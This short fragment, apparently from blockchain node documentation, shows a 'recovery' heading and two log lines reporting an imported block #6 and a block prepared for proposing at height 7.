# recovery
🏆 Imported #6
🎁 Prepared block for proposing at 7 (1 ms) ... extrinsics_count: 1
```
